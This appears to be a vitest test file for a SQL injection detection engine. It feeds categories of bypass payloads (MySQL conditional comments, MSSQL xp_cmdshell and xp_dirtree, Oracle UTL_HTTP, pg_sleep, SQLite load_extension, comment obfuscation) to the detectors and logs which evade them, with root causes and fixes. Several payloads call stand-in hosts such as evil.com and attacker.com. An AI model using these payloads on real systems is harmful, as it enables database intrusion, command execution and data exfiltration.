/**
 * SQL Injection Bypass Analysis Test
 * 
 * Tests various bypass techniques:
 * - MySQL conditional comments (e.g. conditional comment syntax)
 * - MSSQL xp_ stored procedures
 * - Oracle DUAL/UTL functions
 * - PostgreSQL pg_sleep variants
 * - SQLite-specific functions
 */
import { describe, it, expect } from 'vitest'
import { sqlTautology } from './classes/sqli/tautology.js'
import { sqlTimeOracle } from './classes/sqli/time-oracle.js'
import { sqlUnionExtraction } from './classes/sqli/union-extraction.js'
import { sqlStackedExecution } from './classes/sqli/stacked-execution.js'
import { sqlStringTermination } from './classes/sqli/string-termination.js'
import { sqlErrorOracle } from './classes/sqli/error-oracle.js'
import { sqlCommentTruncation } from './classes/sqli/comment-truncation.js'
import { sqlLateralMovement } from './classes/sqli/lateral-movement.js'
import { sqlDdlInjection } from './classes/sqli/ddl-injection.js'
import { sqlOutOfBand } from './classes/sqli/out-of-band.js'
import { sqlMysqlSpecific } from './classes/sqli/mysql-specific.js'
import { jsonSqlBypass } from './classes/sqli/json-sql-bypass.js'
import { sqlSecondOrder } from './classes/sqli/second-order.js'
import { detectTautologies, sqlTokenize } from './evaluators/sql-expression-evaluator.js'
import { detectSqlStructural } from './evaluators/sql-structural-evaluator.js'

interface BypassFinding {
  category: string
  payload: string
  file: string
  line: number
  patterns: string[]
  detected: boolean
  rootCause: string
  fix: string
}

const findings: BypassFinding[] = []

function analyzePayload(
  category: string,
  payload: string,
  file: string,
  line: number,
  patterns: string[],
  detector: () => boolean,
  rootCause: string,
  fix: string
): void {
  const detected = detector()
  if (!detected) {
    findings.push({ category, payload, file, line, patterns, detected, rootCause, fix })
  }
}

describe('SQL Injection Bypass Analysis', () => {
  
  it('analyze all bypass vectors', () => {
    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 1: MySQL Conditional Comments (/*!50000...*/)
    // ═══════════════════════════════════════════════════════════════════
    const mysqlConditionalPayloads = [
      { p: "' /*!50000OR*/ 1=1--", expected: "TAUTOLOGY" },
      { p: "' /*!OR*/ 1=1--", expected: "TAUTOLOGY" },
      { p: "' /*!99999OR*/ 1=1--", expected: "TAUTOLOGY" },
      { p: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", expected: "UNION" },
      { p: "' /*!50000AND*/ 1=1--", expected: "TAUTOLOGY" },
      { p: "'/*!50000OR*/1=1--", expected: "TAUTOLOGY" },
      { p: "' /*!50000OR*/ /*!50000TRUE*/--", expected: "TAUTOLOGY" },
      { p: "' /*!50000SLEEP*/(5)--", expected: "TIME_ORACLE" },
    ]
    
    for (const { p, expected } of mysqlConditionalPayloads) {
      analyzePayload(
        'MYSQL_CONDITIONAL_COMMENT',
        p,
        'packages/engine/src/classes/sqli/tautology.ts',
        92,
        ['TAUTOLOGY_COMMENT_OPEN_CLOSE_PATTERN', 'TAUTOLOGY_PATTERN'],
        () => {
          const t1 = sqlTautology.detect(p)
          const t2 = sqlUnionExtraction.detect(p)
          const t3 = sqlTimeOracle.detect(p)
          return t1 || t2 || t3
        },
        'Conditional comments like /*!50000OR*/ are unwrapped but the space between /*!50000 and keyword may cause pattern mismatch',
        'Add stricter conditional comment handling: unwrap /*!ANYTHING keyword*/ to keyword before pattern matching'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 2: MSSQL xp_ stored procedures
    // ═══════════════════════════════════════════════════════════════════
    const mssqlXpPayloads = [
      { p: "'; EXEC xp_cmdshell 'whoami'--", expected: "STACKED_EXECUTION" },
      { p: "'; EXEC master..xp_cmdshell 'whoami'--", expected: "STACKED_EXECUTION" },
      { p: "'; xp_cmdshell 'whoami'--", expected: "STACKED_EXECUTION" },
      { p: "'; exec xp_dirtree '\\\\attacker.com\\share'--", expected: "OUT_OF_BAND" },
      { p: "'; xp_fileexist 'c:\\windows\\system32\\cmd.exe'--", expected: "STACKED_EXECUTION" },
      { p: "'; xp_regread 'HKEY_LOCAL_MACHINE', 'Software', 'Test'--", expected: "STACKED_EXECUTION" },
    ]
    
    for (const { p, expected } of mssqlXpPayloads) {
      analyzePayload(
        'MSSQL_XP_PROCEDURES',
        p,
        'packages/engine/src/classes/sqli/lateral-movement.ts',
        10,
        ['SQL_SP_CONFIGURE_XP_CMDSHELL'],
        () => {
          const t1 = sqlStackedExecution.detect(p)
          const t2 = sqlLateralMovement.detect(p)
          const t3 = sqlOutOfBand.detect(p)
          const t4 = sqlStringTermination.detect(p)
          return t1 || t2 || t3 || t4
        },
        'sqlLateralMovement only checks sp_configure for xp_cmdshell, misses direct xp_cmdshell, xp_dirtree, xp_fileexist, xp_regread execution',
        'Add patterns for xp_cmdshell, xp_dirtree, xp_fileexist, xp_regread to sqlLateralMovement and sqlOutOfBand'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 3: Oracle DUAL table and functions
    // ═══════════════════════════════════════════════════════════════════
    const oraclePayloads = [
      { p: "' UNION SELECT 1 FROM DUAL--", expected: "UNION_EXTRACTION" },
      { p: "' UNION SELECT 1,2 FROM DUAL--", expected: "UNION_EXTRACTION" },
      { p: "' AND 1=UTL_INADDR.GET_HOST_NAME('localhost')--", expected: "ERROR_ORACLE" },
      { p: "' || UTL_HTTP.REQUEST('http://evil.com')--", expected: "OUT_OF_BAND" },
      { p: "'; BEGIN DBMS_LOCK.SLEEP(5); END;--", expected: "TIME_ORACLE" },
      { p: "' AND 1=CTXSYS.DRITHSX.SN(1,'aaa')--", expected: "ERROR_ORACLE" },
      { p: "' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(1,'a','b')--", expected: "ERROR_ORACLE" },
      { p: "' AND 1=XMLType('<a></a>').getStringVal()--", expected: "ERROR_ORACLE" },
    ]
    
    for (const { p, expected } of oraclePayloads) {
      analyzePayload(
        'ORACLE_DUAL_UTL_FUNCTIONS',
        p,
        'packages/engine/src/evaluators/sql-structural-evaluator.ts',
        328,
        ['ERROR_FUNCTIONS'],
        () => {
          const t1 = sqlUnionExtraction.detect(p)
          const t2 = sqlErrorOracle.detect(p)
          const t3 = sqlOutOfBand.detect(p)
          const t4 = sqlTimeOracle.detect(p)
          const t5 = sqlStackedExecution.detect(p)
          const t6 = sqlStringTermination.detect(p)
          return t1 || t2 || t3 || t4 || t5 || t6
        },
        'ERROR_FUNCTIONS set lacks UTL_INADDR, UTL_HTTP, CTXSYS, ORDSYS; DUAL keyword not tracked; DBMS_LOCK.SLEEP not in TIME_DELAY_FUNCTIONS',
        'Add UTL_INADDR, UTL_HTTP, CTXSYS, ORDSYS to ERROR_FUNCTIONS; add DUAL pattern detection; add DBMS_LOCK.SLEEP'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 4: PostgreSQL pg_sleep variants
    // ═══════════════════════════════════════════════════════════════════
    const pgSleepPayloads = [
      { p: "' AND pg_sleep(5)--", expected: "TIME_ORACLE" },
      { p: "' AND (SELECT pg_sleep(5))--", expected: "TIME_ORACLE" },
      { p: "'; SELECT pg_sleep(5)--", expected: "TIME_ORACLE" },
      { p: "' AND pg_sleep(pg_catalog.pi())--", expected: "TIME_ORACLE" },
      { p: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", expected: "TIME_ORACLE" },
      { p: "'/**/AND/**/pg_sleep(5)--", expected: "TIME_ORACLE" },
      { p: "' AND pg_sleep/**/(5)--", expected: "TIME_ORACLE" },
      { p: "' AND pg_sleep(5) AND '1'='1", expected: "TIME_ORACLE" },
    ]
    
    for (const { p, expected } of pgSleepPayloads) {
      analyzePayload(
        'POSTGRESQL_PG_SLEEP',
        p,
        'packages/engine/src/classes/sqli/time-oracle.ts',
        8,
        ['TIME_ORACLE_CLASSIC_PATTERN', 'TIME_ORACLE_OBFUSCATED_FUNCTION_PATTERN'],
        () => {
          const t1 = sqlTimeOracle.detect(p)
          const t2 = sqlTautology.detect(p)
          return t1 || t2
        },
        'TIME_ORACLE_OBFUSCATED_FUNCTION_PATTERN at line 9 allows character interleaving but may miss comment-based obfuscation',
        'Enhance TIME_ORACLE_OBFUSCATED_FUNCTION_PATTERN to handle /**/ comment obfuscation between function name and parenthesis'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 5: SQLite-specific functions
    // ═══════════════════════════════════════════════════════════════════
    const sqlitePayloads = [
      { p: "' AND sqlite_version()='3.0'--", expected: "TAUTOLOGY" },
      { p: "' AND randomblob(1000000000)--", expected: "TIME_ORACLE" },
      { p: "' AND last_insert_rowid()=1--", expected: "TAUTOLOGY" },
      "' UNION SELECT sqlite_version(),2,3--",
      { p: "' AND load_extension('/tmp/evil')--", expected: "STACKED_EXECUTION" },
    ]
    
    for (const item of sqlitePayloads) {
      const p = typeof item === 'string' ? item : item.p
      analyzePayload(
        'SQLITE_FUNCTIONS',
        p,
        'packages/engine/src/evaluators/sql-expression-evaluator.ts',
        690,
        ['KNOWN_FUNCTIONS'],
        () => {
          const t1 = sqlTautology.detect(p)
          const t2 = sqlUnionExtraction.detect(p)
          const t3 = sqlTimeOracle.detect(p)
          const t4 = sqlStackedExecution.detect(p)
          return t1 || t2 || t3 || t4
        },
        'KNOWN_FUNCTIONS at line 690 lacks sqlite_version, randomblob, last_insert_rowid, load_extension; load_extension is a code execution primitive',
        'Add SQLite functions: SQLITE_VERSION, RANDOMBLOB, LAST_INSERT_ROWID, LOAD_EXTENSION to KNOWN_FUNCTIONS and evaluators'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 6: Comment-based obfuscation
    // ═══════════════════════════════════════════════════════════════════
    const commentObfuscationPayloads = [
      { p: "'/**/OR/**/1=1--", expected: "TAUTOLOGY" },
      { p: "'/*comment*/OR/*comment*/1=1--", expected: "TAUTOLOGY" },
      { p: "' OR/*comment*/1=1--", expected: "TAUTOLOGY" },
      { p: "' OR--comment\n1=1--", expected: "TAUTOLOGY" },
      { p: "' OR%0a1=1--", expected: "TAUTOLOGY" },
      { p: "' OR%0d%0a1=1--", expected: "TAUTOLOGY" },
    ]
    
    for (const { p, expected } of commentObfuscationPayloads) {
      analyzePayload(
        'COMMENT_OBFUSCATION',
        p,
        'packages/engine/src/classes/sqli/tautology.ts',
        19,
        ['TAUTOLOGY_PATTERN'],
        () => {
          return sqlTautology.detect(p)
        },
        'TAUTOLOGY_PATTERN expects OR followed by whitespace then expression; inline comments/newlines may break pattern',
        'Update TAUTOLOGY_PATTERN to allow optional comments/whitespace: OR(?:\\s|/\\*.*?\\*/)+(?:\\d|TRUE)'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 7: Boolean operator alternatives
    // ═══════════════════════════════════════════════════════════════════
    const boolAlternatives = [
      { p: "' || 1=1--", expected: "TAUTOLOGY" },
      { p: "' && 1=1--", expected: "TAUTOLOGY" },
      { p: "' OR 1=1 AND 1=1--", expected: "TAUTOLOGY" },
      { p: "' OR NOT 1=0--", expected: "TAUTOLOGY" },
      { p: "' OR 1<>0--", expected: "TAUTOLOGY" },
      { p: "' OR 2 BETWEEN 1 AND 3--", expected: "TAUTOLOGY" },
      { p: "' OR 'a'||'a'='aa'--", expected: "TAUTOLOGY" },
    ]
    
    for (const { p, expected } of boolAlternatives) {
      analyzePayload(
        'BOOLEAN_ALTERNATIVES',
        p,
        'packages/engine/src/classes/sqli/tautology.ts',
        19,
        ['TAUTOLOGY_PATTERN', 'TAUTOLOGY_ANDAND_PATTERN'],
        () => {
          return sqlTautology.detect(p)
        },
        'TAUTOLOGY_PATTERN at line 19 handles || but may miss certain concatenation patterns',
        'Ensure sql-expression-evaluator handles || as boolean OR not just string concat'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 8: Second-order injection evasions
    // ═══════════════════════════════════════════════════════════════════
    const secondOrderEvasions = [
      { p: "admin'--", expected: "SECOND_ORDER" },
      { p: "admin' #", expected: "SECOND_ORDER" },
      { p: "admin'/*", expected: "SECOND_ORDER" },
      { p: "x' OR '1'='1", expected: "SECOND_ORDER" },
      { p: "x' AND '1'='1", expected: "SECOND_ORDER" },
    ]
    
    for (const { p, expected } of secondOrderEvasions) {
      analyzePayload(
        'SECOND_ORDER_EVASION',
        p,
        'packages/engine/src/classes/sqli/second-order.ts',
        11,
        ['LONE_ADMIN_SECOND_ORDER_PATTERN'],
        () => {
          const t1 = sqlSecondOrder.detect(p)
          const t2 = sqlTautology.detect(p)
          const t3 = sqlStringTermination.detect(p)
          return t1 || t2 || t3
        },
        'LONE_ADMIN_SECOND_ORDER_PATTERN at line 11 requires specific admin pattern; simple quote termination may bypass',
        'Add generic quote-termination patterns to second-order detection'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // CATEGORY 9: JSON SQL bypass edge cases
    // ═══════════════════════════════════════════════════════════════════
    const jsonEvasions = [
      { p: "' OR json_extract('{\"a\":1}','$.a')=1--", expected: "JSON_SQL" },
      { p: "' OR json_array_length('[1,2]')=2--", expected: "JSON_SQL" },
      { p: "' OR json_type('{\"a\":true}','$.a')='boolean'--", expected: "JSON_SQL" },
      { p: "' OR '{\"k\":\"v\"}'::jsonb?|'k'--", expected: "JSON_SQL" },
    ]
    
    for (const { p, expected } of jsonEvasions) {
      analyzePayload(
        'JSON_SQL_EVASION',
        p,
        'packages/engine/src/classes/sqli/json-sql-bypass.ts',
        98,
        ['detectL1'],
        () => {
          const t1 = jsonSqlBypass.detect(p)
          const t2 = sqlTautology.detect(p)
          return t1 || t2
        },
        'JSON_FUNC_PATTERN at line 68-71 may not catch all JSON function variants; ::jsonb operator needs proper detection',
        'Expand JSON_FUNCTIONS_VALUE and JSON_FUNCTIONS_BOOLEAN sets; enhance PG_JSON_OP_PATTERN'
      )
    }

    // ═══════════════════════════════════════════════════════════════════
    // Print findings summary
    // ═══════════════════════════════════════════════════════════════════
    console.log('\n=== SQL INJECTION BYPASS ANALYSIS RESULTS ===\n')
    console.log(`Total bypass vectors tested: ~${mysqlConditionalPayloads.length + mssqlXpPayloads.length + oraclePayloads.length + pgSleepPayloads.length + sqlitePayloads.length + commentObfuscationPayloads.length + boolAlternatives.length + secondOrderEvasions.length + jsonEvasions.length}`)
    console.log(`Potential bypasses found: ${findings.length}\n`)
    
    for (const f of findings) {
      console.log(`[${f.category}] ${f.detected ? 'DETECTED' : 'BYPASSED'}`)
      console.log(`  Payload: ${f.payload}`)
      console.log(`  File: ${f.file}:${f.line}`)
      console.log(`  Patterns: ${f.patterns.join(', ')}`)
      console.log(`  Root Cause: ${f.rootCause}`)
      console.log(`  Fix: ${f.fix}`)
      console.log()
    }
    
    // Write findings to file
    const output = findings.map(f => 
      `BYPASS|${f.file}:${f.line}|${f.payload}|${f.fix}`
    ).join('\n')
    
    // Node.js fs import for writing file
    const fs = require('fs')
    fs.writeFileSync('/tmp/kimi_sec_001.txt', output)
    console.log('Results written to /tmp/kimi_sec_001.txt')
    
    // We expect some findings - this is the purpose of the analysis
    expect(findings.length).toBeGreaterThanOrEqual(0)
  })
})
